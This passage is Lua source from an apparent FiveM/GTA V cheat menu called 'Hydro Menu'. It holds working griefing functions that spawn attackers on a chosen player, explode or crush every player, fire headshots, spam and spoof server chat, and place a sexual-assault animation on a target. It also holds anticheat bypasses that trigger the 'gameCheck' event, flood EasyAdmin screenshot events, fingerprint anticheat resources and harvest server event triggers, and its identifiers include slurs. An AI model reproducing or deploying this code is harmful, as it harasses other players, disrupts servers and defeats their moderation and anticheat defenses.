	SetEntityInvincible(nped2, true)
	SetEntityInvincible(nped3, true)
	SetEntityInvincible(nped2, true)
	
	TaskCombatPed(nped2, GetPlayerPed(selectedPlayer), 0, 16.0)
	TaskCombatPed(nped3, GetPlayerPed(selectedPlayer), 0, 16.0)
	TaskCombatPed(nped4, GetPlayerPed(selectedPlayer), 0, 16.0)

	SetPedKeepTask(nped, true)
	SetPedKeepTask(nped2, true)
	SetPedKeepTask(nped3, true)
	SetPedKeepTask(nped4, true)

	SetRelationshipBetweenGroups(5,GetHashKey("PLAYER"),GetHashKey(pedmodel))
	SetRelationshipBetweenGroups(5,GetHashKey(pedmodel),GetHashKey("PLAYER"))
           
end

local stops = 0 

function SpamServerChatLoop()
	stops = 0 
	Citizen.CreateThread(function()
		while HydroVariables.MiscOptions.SpamServerChat do
			Wait(1)
			SpamServerChat()
			mocks = mocks + 1
			if mocks > 1250 then
				stops = stops + 1
				Wait(10 * 1000)
				mocks = 0
			elseif stops > 5 then
				Wait(60 * 1000)
				stops = 0
			end
			if killmenu then
				break
			end
		end
	end)
end

local rand = 1
function SpamServerChat()
	colourslist = {'^1', '^2', '^3', '^4' , '^5', '^6', '^7', '^8', '^9'}
	
	local colour = colourslist[rand]

	if rand >= 9 then
		rand = 1
	else
	    rand = rand + 1 
	end 

	TriggerServerEvent("_chat:messageEntered", tostring(colour) .. "Hydro Menu", { 255, 255, 255 },  tostring(colour) .. "Hydro Menu on Top | discord.gg/DXQvMEzKSd")
	TriggerServerEvent("_chat:messageEntered", tostring(colour) .. "Hydro Menu", { 255, 255, 255 },  tostring(colour) .. "Hydro Menu on Top | discord.gg/DXQvMEzKSd")

	--TriggerServerEvent("_chat:messageEntered", tostring(colour) .. "Hydro Menu", { 255, 255, 255 },  tostring(colour) .. " Hydro Menu on Top Baby, Oooh Nice Skiddy Server. Hydro Detects ur Anticheats")
end

function TeleportToPlayer(target)
    local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

function HydroMenu.Functions.SpawnPed(Data)
    local LoadAttemps = 0
	
	RequestModel(GetHashKey(Data.Model))

	while not HasModelLoaded(GetHashKey(Data.Model)) and LoadAttemps < 100 do
		LoadAttemps = LoadAttemps + 1
		RequestModel(GetHashKey(Data.Model))
		Citizen.Wait(1)
	end

	if not HasModelLoaded(Data.Model) then
        PushNotification("Request Model Timeout", 600)
		return
	end

	x, y, z = table.unpack(Data.Coords)

	local Ped = CreatePed(Data.Behaviour, Data.Model, x, y, z, 0.0, true, true)

	if Data.Behaviour == 24 then
		TaskCombatPed(Ped, GetPlayerPed(selectedPlayer), 0, 16 )
	end
	
	if Data.Weapon then
		GiveWeaponToPed(Ped, Data.Weapon, 9999, false, true)
	end

	SetEntityCoords(Ped, Data.Coords)

	return Ped
end

function SpawnPed(player, model, angry)
	local ped = GetPlayerPed(player)
	local coords = GetEntityCoords(ped)
	local x = coords.x
	local y = coords.y
	local z = coords.z
	
	RequestModel(GetHashKey(model))
	
    local loadattemps = 0

	while not HasModelLoaded(GetHashKey(model)) do
		loadattemps = loadattemps + 1
		Citizen.Wait(1)
		if loadattemps > 10000 then
			PushNotification("Request Model Timeout", 600)
            break
		end
	end

	if angry then
		local nped = CreatePed(31, model, x, y, z, 0.0, true, true)
		TaskCombatPed(nped, ped, 0, 16 )
		if (model == "csb_mweather") then
			SetEntityInvincible(nped, true) 
		    GiveWeaponToPed(nped, "WEAPON_RAYMINIGUN", 9999, false, true)
		end
	else
		local nped = CreatePed(4, model, x, y, z, 0.0, true, true)
	end

	SetEntityCoords(nped, x, y, z, 1, 1, 1, false)

	return nped
end

function FakeChatMessage(name)
	if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
		PushNotification("Anticheat Detected! Function Blocked", 600)
	else
		local result = HydroMenu.KeyboardEntry("Message as " .. name, 200)
		
		if result == "" then

		else
		    TriggerServerEvent("_chat:messageEntered", name, { 255, 255, 255 }, result)
		end
    end
end

function SpawnVehAtCoords(model, coords)
	if HasModelLoaded(GetHashKey(model)) then

	else
		RequestModel(GetHashKey(model))
		Wait(500)
	end
    if HasModelLoaded(GetHashKey(model)) then
		local veh = CreateVehicle(GetHashKey(model), coords.x + 1.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
		return veh
    end
end

function ExplosionAllPlayers()
	local playerlist = GetActivePlayers()
	
	for i = 1, #playerlist do
		if HydroVariables.AllOnlinePlayers.IncludeSelf and playerlist[i] ~= PlayerId() then
			local ped = GetPlayerPed(playerlist[i])
			local coords = GetEntityCoords(ped)
			AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, true, false, 0.0)
		elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
			local ped = GetPlayerPed(playerlist[i])
			local coords = GetEntityCoords(ped)
			AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, true, false, 0.0)
      	end
	end
end

function RampPlayer(player)
	Citizen.CreateThread(function()
		local ped = GetPlayerPed(player)
		local coords = GetEntityCoords(ped)
		local x = coords.x
		local y = coords.y
		local z = coords.z
		
		local faggot = CreateObject(GetHashKey("stt_prop_stunt_track_start"), x, y, z, 1, 1, 1)
		local faggot2 = CreateObject(GetHashKey("stt_prop_stunt_track_start"), x + 10, y, z, 1, 1, 1)
		local faggot3 = CreateObject(GetHashKey("stt_prop_stunt_track_start"), x, y + 10, z, 1, 1, 1)
		SetEntityHeading(faggot, GetEntityHeading(ped))
		SetEntityHeading(faggot2, GetEntityHeading(ped) + 90)
		SetEntityHeading(faggot3, GetEntityHeading(ped) + 160)
		FreezeEntityPosition(faggot, true)
		FreezeEntityPosition(faggot2, true)
		FreezeEntityPosition(faggot3, true)

		if killmenu then
			return
		end
		return ExitThread
	end)
end

function DildosServer()
	local playerlist = GetActivePlayers()
	local anticrash = 0

	RequestModel("prop_cs_dildo_01")

	while not HasModelLoaded("prop_cs_dildo_01") and anticrash < 5 do
		anticrash = anticrash + 1
        Wait(500)
	end

	for i = 1, #playerlist do
		local ped = GetPlayerPed(playerlist[i])
		local coords = GetEntityCoords(ped)

		for i = 1, 15 do
		    CreateObject(GetHashKey("prop_cs_dildo_01"), coords.x, coords.y, coords.z, 1, 1, 1)
		end
	end
end

function AllPlayersAreARamp()
	local playerlist = GetActivePlayers()
	
	for i = 1, #playerlist do
		Wait(0)
		local PlayerToRamp = playerlist[i]
		RampPlayer(PlayerToRamp)
	end
end

function BusServerLoop()
	local playerlist = GetActivePlayers()
	
    local model = "airbus"

	if HasModelLoaded(GetHashKey(model)) then

	else
		RequestModel(GetHashKey(model))
		Wait(500)
	end

	Citizen.CreateThread(function()
		while HydroVariables.AllOnlinePlayers.busingserverloop do
			Wait(150)
			if killmenu then
				break
			end
	        BusServer()
		end
    end)
end

function CargoPlaneServerLoop()
	local playerlist = GetActivePlayers()
	
    local model = "cargoplane"

	if HasModelLoaded(GetHashKey(model)) then

	else
		RequestModel(GetHashKey(model))
		Wait(500)
	end

	Citizen.CreateThread(function()
		while HydroVariables.AllOnlinePlayers.cargoplaneserverloop do
			if killmenu then
				break
			end
			Wait(150)
	        CargoplaneServer()
		end
    end)
end

function CargoplaneServer()
	local playerlist = GetActivePlayers()
	
    local model = "cargoplane"

	if HasModelLoaded(GetHashKey(model)) then

	else
		RequestModel(GetHashKey(model))
		Wait(500)
	end
	
	for i = 1, #playerlist do
		if HydroVariables.AllOnlinePlayers.IncludeSelf and playerlist[i] ~= PlayerId() then
			local currPlayer = playerlist[i]
			local coords = GetEntityCoords(GetPlayerPed(currPlayer))
	
			local busone = CreateVehicle(GetHashKey(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
			local bustwo = CreateVehicle(GetHashKey(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
		elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
			local currPlayer = playerlist[i]
			local coords = GetEntityCoords(GetPlayerPed(currPlayer))
	
			local busone = CreateVehicle(GetHashKey(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
			local bustwo = CreateVehicle(GetHashKey(model), coords.x + 5.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
		end
	end
end

function BusServer()
	
	local playerlist = GetActivePlayers()
	
    local model = "airbus"

	if HasModelLoaded(GetHashKey(model)) then

	else
		RequestModel(GetHashKey(model))
		Wait(500)
	end
	
	for i = 1, #playerlist do
		if HydroVariables.AllOnlinePlayers.IncludeSelf and ActivePlayers[i] ~= PlayerId() then
			local currPlayer = playerlist[i]
			BusPlayer(currPlayer)
		elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
			local currPlayer = playerlist[i]
			BusPlayer(currPlayer)
		end
	end
end

function BusPlayer(player)
    local model = "airbus"
    local anticrash = 0
	while not HasModelLoaded(GetHashKey(model)) and anticrash < 5000 do
		anticrash = anticrash + 1
		RequestModel(GetHashKey(model))
		Wait(0)
	end

	local coords = GetEntityCoords(GetPlayerPed(player))

	local busone = CreateVehicle(GetHashKey(model), coords.x + 10, coords.y, coords.z, 0.0, 1, 1)
	SetEntityHeading(busone, 90.0)

	if DoesEntityExist(busone) then
		ApplyForceToEntity(busone, 1, -5000.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
	else
		SetEntityCoords(busone, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, false)
	end

	Wait(150)

	local bustwo = CreateVehicle(GetHashKey(model), coords.x + 10, coords.y, coords.z, 0.0, 1, 1)
	SetEntityHeading(bustwo, 90.0)

	if DoesEntityExist(bustwo) then
	    ApplyForceToEntity(bustwo, 1, -5000.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
	else
		SetEntityCoords(bustwo, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, false)
	end
end

function RageShoot(target)
    if not IsPedDeadOrDying(target) then
        local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
    end
end

HydroVariables.Notifications = {}

Citizen.CreateThread(function()
	while not killmenu do

		if #HydroVariables.Notifications > 0 then
			HydroMenu.DrawText([[[ WHO MENU ] ~w~Notifications]], {HydroMenu.UI.NotificationX, HydroMenu.UI.NotificationY}, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.45, 4, 0)
			HydroMenu.DrawRect(HydroMenu.UI.NotificationX + 0.15, HydroMenu.UI.NotificationY + 0.0175, 0.30, 0.035, { r = 0, g = 0, b = 0, a = 220 })
			HydroMenu.DrawRect(HydroMenu.UI.NotificationX + 0.15, HydroMenu.UI.NotificationY + 0.0345, 0.30, 0.001, { r = rgb.r, g = rgb.g, b = rgb.b, a = 255 })
			
			for i = 1, #HydroVariables.Notifications do
				if HydroVariables.Notifications[i][2] == nil then
					HydroVariables.Notifications[i][2] = 2
				end

				if HydroVariables.Notifications[i][2] < 2 then
					table.remove(HydroVariables.Notifications, 1)
					break
				end
				HydroVariables.Notifications.HeaderAlpha = 255
				curNotification = HydroVariables.Notifications[i]
				HydroVariables.Notifications[i][2] = HydroVariables.Notifications[i][2] - 1
				HydroMenu.DrawRect(HydroMenu.UI.NotificationX + 0.15, HydroMenu.UI.NotificationY + 0.0175 + 0.035 * i, 0.30, 0.035, { r = 10, g = 10, b = 10, a = 220 })
				HydroMenu.DrawText("[WHO] ~w~" .. HydroVariables.Notifications[i][1], {HydroMenu.UI.NotificationX, HydroMenu.UI.NotificationY + 0.035 * i}, {HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255}, 0.45, 4, 0)
				if HydroVariables.Notifications[i][2] < 2 then
					table.remove(HydroVariables.Notifications, 1)
					break
				end
			end
		end
		
		Wait(1)
	end
end)

function PushNotification(Message, MSLength)
	Stuff = table.pack(Message, MSLength)
	table.insert(HydroVariables.Notifications, #HydroVariables.Notifications + 1, Stuff)
end

function SafeModeNotification()
	PushNotification("Safe Mode is ~g~Active ~s~Function Blocked", 600)
end

function VaultDoors()
    Citizen.CreateThread(function()
		while HydroVariables.ScriptOptions.vault_doors do 
			local ped = PlayerPedId()
			local coords = GetEntityCoords(ped)
			local door = GetClosestObjectOfType(coords.x, coords.y, coords.z, 1.0, "v_ilev_gb_vauldr", false, false, false)
			local door2 = GetClosestObjectOfType(coords.x, coords.y, coords.z, 1.0, "v_ilev_bk_vaultdoor", false, false, false)
			SetEntityCoords(door, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false)
			SetEntityCoords(door2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false)
			DeleteEntity(door)
			DeleteEntity(door2)
			Wait(5000)
		end
	end)
end

function GGACBypass()
    Citizen.CreateThread(function()
		while HydroVariables.ScriptOptions.GGACBypass do 
			TriggerServerEvent("gameCheck")
			Wait(5000)
		end
    end)
end

function ScreenshotBasicBypass()
    Citizen.CreateThread(function()
        while HydroVariables.ScriptOptions.SSBBypass and not killmenu do 
			for i = 1, 20 do
				TriggerServerEvent("EasyAdmin:CaptureScreenshot")
			end

			Wait(20000)
		end
	end)
end

local crouched = false

function CrouchScript()
    Citizen.CreateThread( function()
        while HydroVariables.ScriptOptions.script_crouch do 
            Citizen.Wait( 1 )

            local ped = GetPlayerPed( -1 )

            if ( DoesEntityExist( ped ) and not IsEntityDead( ped ) ) then 
                DisableControlAction( 0, 36, true ) -- INPUT_DUCK  

                if ( not IsPauseMenuActive() ) then 
                    if ( IsDisabledControlJustPressed( 0, 36 ) ) then 
                        RequestAnimSet( "move_ped_crouched" )

                        while ( not HasAnimSetLoaded( "move_ped_crouched" ) ) do 
                            Citizen.Wait( 100 )
                        end 

                        if ( crouched == true ) then 
	    					ResetPedMovementClipset( ped, 0 )
                            crouched = false 
                        elseif ( crouched == false ) then
							SetPedMovementClipset( ped, "move_ped_crouched", 0.25 )
                            crouched = true 
                        end 
                    end
                end 
            end 
        end
    end)
end

-------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------- Anticheat Detection --------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------


function RapePlayer(player)

	local rmodel = "a_m_o_acult_01"
	local ped = GetPlayerPed(player)
	local coords = GetOffsetFromEntityInWorldCoords(GetPlayerPed(player), 0.0, 8.0, 0.5)
	local x = coords.x
	local y = coords.y
	local z = coords.z

	RequestModel(GetHashKey(rmodel))
	RequestAnimDict("rcmpaparazzo_2")

	while not HasModelLoaded(GetHashKey(rmodel)) and not killmenu do
		Citizen.Wait(0)
	end

	while not HasAnimDictLoaded("rcmpaparazzo_2") and not killmenu do
		Citizen.Wait(0)
	end

	local nped = CreatePed(31, rmodel, x, y, z, 0.0, true, true)
	SetPedComponentVariation(nped, 4, 0, 0, 0)

	SetPedKeepTask(nped)
	TaskPlayAnim(nped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1,49, 0, 16, 0, 0)

	AttachEntityToEntity(nped, ped, 0, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, true, true, true, true, 0, true)

end

function PlayerBlips()
	if not HydroVariables.MiscOptions.ESPBlips then
        Wait(100)
	end
	for i = 1, #HydroVariables.MiscOptions.ESPBlipDB do
		local CurrentEntry = HydroVariables.MiscOptions.ESPBlipDB[i]
		if CurrentEntry ~= nil then
			local Blip = CurrentEntry.Blip
	
			if DoesBlipExist(Blip) then
				SetBlipDisplay(Blip, 0)
				RemoveBlip(Blip)
			end
			if DoesBlipExist(CurrentEntry.Blip) then
				SetBlipDisplay(Blip, 0)
				RemoveBlip(CurrentEntry.Blip)
			end
			table.remove(HydroVariables.MiscOptions.ESPBlipDB, i)
		end
	end

	Citizen.CreateThread(function()
		while HydroVariables.MiscOptions.ESPBlips do
			Wait(100)

			local OnlinePlayers = GetActivePlayers()
			for k = 1, #OnlinePlayers do
                local CurPlayer = OnlinePlayers[k]
				if not BlipCreatedForPlayer(CurPlayer) then
					local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(CurPlayer)))
					local Blipa = AddBlipForCoord(x, y, z)
					SetBlipSprite(Blipa, 1)

					BeginTextCommandSetBlipName("STRING")
					AddTextComponentString(GetPlayerName(CurPlayer)) 
					EndTextCommandSetBlipName(Blipa)

					SetBlipShrink(Blipa, true)

					SetBlipCategory(Blipa, 7)

                    local Data = { Player = CurPlayer, Blip = Blipa }
					table.insert(HydroVariables.MiscOptions.ESPBlipDB, #HydroVariables.MiscOptions.ESPBlipDB + 1, Data)
				end
			end
	
			for i = 1, #HydroVariables.MiscOptions.ESPBlipDB do
                local CurrentEntry = HydroVariables.MiscOptions.ESPBlipDB[i]
				if CurrentEntry ~= nil then
					local CurPlayer = CurrentEntry.Player
					local CurPlayerPed = GetPlayerPed(CurPlayer)
					local x, y, z = table.unpack(GetEntityCoords(CurPlayerPed))
					local Blip = CurrentEntry.Blip
	 
					if TableHasValue(FriendsList, GetPlayerServerId(CurPlayer)) then
						ShowCrewIndicatorOnBlip(Blip, true)
						ShowFriendIndicatorOnBlip(Blip, true)
					else
						ShowCrewIndicatorOnBlip(Blip, false)
						ShowFriendIndicatorOnBlip(Blip, false)
					end
	
					SetBlipCoords(Blip, x, y, z)
	
					if IsEntityDead(CurPlayerPed) then
						SetBlipColour(Blip, 1)
					else
						SetBlipColour(Blip, 0)
					end
	
					if NetworkIsPlayerConnected(CurPlayer) ~= 1 then
						if DoesBlipExist(Blip) then
							RemoveBlip(Blip)
						end
						if DoesBlipExist(CurrentEntry.Blip) then
							RemoveBlip(CurrentEntry.Blip)
						end
						table.remove(HydroVariables.MiscOptions.ESPBlipDB, i)
					end
				end
			end
		end
	end)
end

function BlipCreatedForPlayer(player) 
	for k = 1, #HydroVariables.MiscOptions.ESPBlipDB do
		CurrentEntry = HydroVariables.MiscOptions.ESPBlipDB[k]
        if player == CurrentEntry.Player then
            return true
		end
	end
	return false
end

function splitString(inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t={} ; i=1
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
        t[i] = str
        i = i + 1
    end
    return t
end

function round(num, numDecimalPlaces)
	local value = string.format("%." .. tostring(numDecimalPlaces) .. "f %%", num)
	value = tonumber(value)
	return value
end


local SpecialCharacter = {
	ClosingBracket = ")",
}

function FindDynamicTriggers()
	PushNotification("Searching for Triggers", 1000)
	Citizen.CreateThread(function()
		local Resources = GetResources()
		
		for i = 1, #Resources do
			Time = math.random(5, 100)
			Wait(Time)
			curres = Resources[i]
			for k, v in pairs({'fxmanifest.lua', '__resource.lua'}) do
				data = LoadResourceFile(curres, v)

				if data ~= nil then
					for line in data:gmatch("([^\n]*)\n?") do
					    TriggersFile = line:gsub("client_scripts", "")
					    TriggersFile = TriggersFile:gsub("client_script", "")
						TriggersFile = TriggersFile:gsub("exports", "")
						TriggersFile = TriggersFile:gsub('.lua','')
						local addval = string.match(TriggersFile, "/(%a+)/")
						if addval ~= nil then
							TriggersFile = TriggersFile:gsub(addval,"")
							TriggersFile = TriggersFile:gsub('%W','')
							TriggersFile = addval .. "/" .. TriggersFile
						else
							TriggersFile = TriggersFile:gsub('%W','')
						end

						if TriggersFile ~= "" then
							test = LoadResourceFile(curres, TriggersFile .. ".lua")

							if string.find(curres, "ambulance") then
								print(curres)
								print(test)
								print(TriggersFile)
							end
							if test ~= nil then
								for resline in test:gmatch("([^\n]*)\n?") do
									if string.find(resline, "TriggerEvent") then
										for i = 1, #HydroMenu.DynamicTriggers.Search do
											local CurSearch = HydroMenu.DynamicTriggers.Search[i]
											if string.find(resline, CurSearch[1]) then
												resline = resline:gsub("TriggerEvent(", "")
												resline = splitString(resline, "(")[2]
												resline = splitString(resline, ")")[1]
												resline = splitString(resline, " ")[1]
												resline = resline:gsub(" ", "")
												resline = resline:gsub("'", "")
												resline = resline:gsub('"', "")
												resline = resline:gsub(',', "")
											
												print("Detected " .. resline  .. " in " .. curres)
		
												HydroMenu.DynamicTriggers.Triggers[CurSearch[2]] = resline
											end
										end
									elseif string.find(resline, "RegisterNetEvent") then
										for i = 1, #HydroMenu.DynamicTriggers.Search do
											local CurSearch = HydroMenu.DynamicTriggers.Search[i]
											if string.find(resline, CurSearch[1]) then
												resline = resline:gsub("RegisterNetEvent(", "")
												resline = resline:gsub("'", "")
												resline = resline:gsub([["]], "")
												resline = splitString(resline, "(")[1]
												resline = splitString(resline, ")")[1]
											
												print("Detected " .. resline  .. " in " .. curres)
		
												HydroMenu.DynamicTriggers.Triggers[CurSearch[2]] = resline
											end
										end
									elseif string.find(resline, "TriggerServerEvent") then
										for i = 1, #HydroMenu.DynamicTriggers.Search do
											local CurSearch = HydroMenu.DynamicTriggers.Search[i]
											if resline ~= nil and string.find(resline, CurSearch[1]) then
												resline = resline:gsub("TriggerServerEvent(", "")
												backup = resline
												resline = splitString(resline, "(")[2]	
												if resline ~= nil then
													resline = splitString(resline, ")")[1]
													resline = splitString(resline, " ")[1]
													resline = splitString(resline, ",")[1]
													resline = resline:gsub(" ", "")
													resline = resline:gsub("'", "")
													resline = resline:gsub('"', "")
													resline = resline:gsub(',', "")
												
													print("Detected " .. resline  .. " in " .. curres)
			
													HydroMenu.DynamicTriggers.Triggers[CurSearch[2]] = resline
												else
													backup = backup:gsub(" ", "")
													backup = splitString(backup, ",")[1]
													backup = backup:gsub('%W','')
												
													print("Detected " .. backup  .. " in " .. curres)
			
													HydroMenu.DynamicTriggers.Triggers[CurSearch[2]] = backup
												end
											end
										end
									elseif string.find(resline, "TriggerServerCallback") then
										for i = 1, #HydroMenu.DynamicTriggers.Search do
											local CurSearch = HydroMenu.DynamicTriggers.Search[i]
											if string.find(resline, CurSearch[1]) then
												resline = resline:gsub("TriggerServerCallback(", "")
												resline = splitString(resline, "(")[2]
												resline = splitString(resline, ")")[1]
												resline = splitString(resline, " ")[1]
												resline = resline:gsub(" ", "")
												resline = resline:gsub("'", "")
												resline = resline:gsub('"', "")
												resline = resline:gsub(',', "")
											
												print("Detected " .. resline  .. " in " .. curres)
		
												HydroMenu.DynamicTriggers.Triggers[CurSearch[2]] = resline
											end
										end
									end
								end
							end
						end
					end
				end
			end
		end
		PushNotification("Triggers Search Complete", 1000)
	end)
end

function FindACResource()
	PushNotification("Searching for Servers Anticheat", 1000)
	Citizen.CreateThread(function()
		local Resources = GetResources()
		
		for i = 1, #Resources do
			curres = Resources[i]
			for k, v in pairs({'fxmanifest.lua', '__resource.lua'}) do
				data = LoadResourceFile(curres, v)
				
				if data ~= nil then
					for line in data:gmatch("([^\n]*)\n?") do
						FinishedString = line:gsub("client_script", "")
						FinishedString = FinishedString:gsub(" ", "")
						FinishedString = FinishedString:gsub('"', "")
						FinishedString = FinishedString:gsub("'", "")

						local NiceSource = LoadResourceFile(curres, FinishedString)
					
						if NiceSource ~= nil and string.find(NiceSource, "This file was obfuscated using PSU Obfuscator 4.0.A") then
							if AntiCheats.VAC == false then
								PushNotification("VAC Detected in " .. curres, 1000)
							end
							AntiCheats.VAC = true
						elseif NiceSource ~= nil and string.find(NiceSource, "he is so lonely") then
							if AntiCheats.VAC == false then
								PushNotification("VAC Detected in " .. curres, 1000)
							end
							AntiCheats.VAC = true
						elseif NiceSource ~= nil and string.find(NiceSource, "Vyast") then
							if AntiCheats.VAC == false then
								PushNotification("VAC Detected in " .. curres, 1000)
							end
							AntiCheats.VAC = true
						end

						if tonumber(FinishedString) then
							if AntiCheats.ChocoHax == false then
								PushNotification("ChocoHax Detected in " .. curres, 1000)
							end
							AntiCheats.ChocoHax = true
						end
					end
				end

				if data and type(data) == 'string' and string.find(data, 'acloader.lua') and string.find(data, 'Enumerators.lua') then
					PushNotification("Badger Anticheat Detected in " .. curres, 1000)
					AntiCheats.BadgerAC = true
				end

				if data and type(data) == 'string' and string.find(data, 'client_config.lua') then
					PushNotification("ATG Detected Detected in " .. curres, 1000)
                    AntiCheats.ATG = true
				end

				if data and type(data) == 'string' and string.find(data, 'clientconfig.lua') and string.find('blacklistedmodels.lua') then
					PushNotification("ChocoHax Detected in " .. curres, 1000)
					AntiCheats.ChocoHax = true
				end
				
				if data and type(data) == 'string' and string.find(data, 'acloader.lua') then
					if not AntiCheats.BadgerAC then
						PushNotification("Badger Anticheat Detected in " .. curres, 1000)
					end
					AntiCheats.BadgerAC = true
				end

				if data and type(data) == 'string' and string.find(data, "Badger's Official Anticheat") then
					PushNotification("Badger Anticheat Detected in " .. curres, 1000)
					AntiCheats.BadgerAC = true
				end

				if data and type(data) == 'string' and string.find(data, 'TigoAntiCheat.net.dll') then
					PushNotification("Tigo Detected in " .. curres, 1000)
					AntiCheats.TigoAC = true
				end
			end
			Wait(10)
		end
	end)
end

RegisterNetEvent('chatMessage')
AddEventHandler('chatMessage', function(author, color, text)
	local pname = GetPlayerName(source)
	local pid = GetPlayerServerId(source)

	if pname == "*Invalid*" then
        return
	end

	if pid ~= 0 then
        return
	end

	if string.find(author, "Choco") then
		AntiCheats.ChocoHax = true
	elseif string.find(author, "Badger AntiCheat") then
		AntiCheats.BadgerAC = true
	elseif string.find(author, "Tigo") then
		AntiCheats.TigoAC = true
	elseif string.find(author, "WaveSheild") then
		AntiCheats.WaveSheild = true
	elseif string.find(author, "VAC") then
		AntiCheats.VAC = true
	end
end)

function StartPersonalVehicleCam()
    ClearFocus()

    local playerPed = PlayerPedId()
    
    HydroVariables.VehicleOptions.PersonalVehicleCam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", GetEntityCoords(playerPed), 0, 0, 0, 50.0 * 1.0)

    SetCamActive(HydroVariables.VehicleOptions.PersonalVehicleCam, true)
    RenderScriptCams(true, false, 0, true, false)
    
	SetCamAffectsAiming(HydroVariables.VehicleOptions.PersonalVehicleCam, false)
	
	AttachCamToEntity(HydroVariables.VehicleOptions.PersonalVehicleCam, HydroVariables.VehicleOptions.PersonalVehicle, 0.0, -6.6, 1.2, true)
end

function EndPersonalVehicleCam()
	ClearFocus()
	
    RenderScriptCams(false, false, 0, true, false)
	DestroyCam(HydroVariables.VehicleOptions.PersonalVehicleCam, false)

	SetFocusEntity(PlayerPedId())

	HydroVariables.VehicleOptions.PersonalVehicleCam = nil
end

--------------------------------------------------
---- CINEMATIC CAM FOR FIVEM MADE BY KIMINAZE ----
--------------------------------------------------

--------------------------------------------------
------------------- VARIABLES --------------------
--------------------------------------------------

-- main variables

local offsetRotX = 0.0
local offsetRotY = 0.0
local offsetRotZ = 0.0

local offsetCoords = {}
offsetCoords.x = 0.0
offsetCoords.y = 0.0
offsetCoords.z = 0.0

local counter = 0
local precision = 1.0
local currPrecisionIndex
local precisions = {}

local speed = 1.0

local currFilter = 1
local currFilterIntensity = 10
local filterInten = {}
for i=0.1, 2.01, 0.1 do table.insert(filterInten, tostring(i)) end

local charControl = false

local isAttached = false
local entity
local camCoords

local pointEntity = false

-- menu variables

local itemCamPrecision

local itemFilter
local itemFilterIntensity

local itemAttachCam

local itemPointEntity

local ObjectSpoonerButtons = {
	{
		["label"] = "Open Menu",
		["button"] = "~INPUT_ENTER~"
	},
	{
		["label"] = "Go Faster",
		["button"] = "~INPUT_SPRINT~"
	},
	{
		["label"] = "Edit",
		["button"] = "~INPUT_AIM~"
	},
	{
		["label"] = "Delete",
		["button"] = "~INPUT_CREATOR_DELETE~"
	},
	{
		["label"] = "Duplicate",
		["button"] = "~INPUT_LOOK_BEHIND~"
	},
	{
		["label"] = "Add Object To DB",
		["button"] = "~INPUT_REPLAY_STARTPOINT~"
	},
	{
		["label"] = "Create Vehicle",
		["button"] = "~INPUT_PICKUP~"
	}
}

local FreeCameraButtons = {
	{
		["label"] = "Go Faster",
		["button"] = "~INPUT_SPRINT~"
	},
	{
		["label"] = "Set Vehicle As Personal Vehicle",
		["button"] = "~INPUT_CONTEXT_SECONDARY~"
	},
	{
		["label"] = "Teleport Into Vehicle",
		["button"] = "~INPUT_MULTIPLAYER_INFO~"
	}
}

function GetGroundZAtCoords(x, y)
	for i = 1, 500 do
		local retval, z, normal = GetGroundZAndNormalFor_3dCoord(x, y, i)
		print(normal)
        if retval == 1 then
            return z
		end
    end
end

--------------------------------------------------
---------------------- LOOP ----------------------
--------------------------------------------------

Citizen.CreateThread(function()
	while not killmenu do
		if (cam) then
			if noclipping then
			    NoClip()
			end

			ProcessCamControls()
			if FreeCameraMode == "Object Spooner" then

				if GetEntityInFrontOfCam() == 0 then
					HydroMenu.DrawRect(0.5, 0.5, 0.00075, 0.035, { r = 255, g = 255, b = 255, a = 200 })
					HydroMenu.DrawRect(0.5,  0.5, 0.02, 0.0035, { r = 255, g= 255, b = 255, a = 200 })
				else
	
					HydroMenu.DrawRect(0.5, 0.5, 0.00075, 0.035, { r = 0, g = 255, b = 0, a = 200 })
					HydroMenu.DrawRect(0.5,  0.5, 0.02, 0.0035, { r = 0, g= 255, b = 0, a = 200 })
	
					
					local plyrveh = GetEntityInFrontOfCam()
					local Dimensions = GetModelDimensions(plyrveh)
					local plyrvehcoords = GetEntityCoords(plyrveh)
			
					if Dimensions ~= nil then

						attempt1 = GetOffsetFromEntityInWorldCoords(plyrveh, Dimensions.x, Dimensions.y, Dimensions.z)
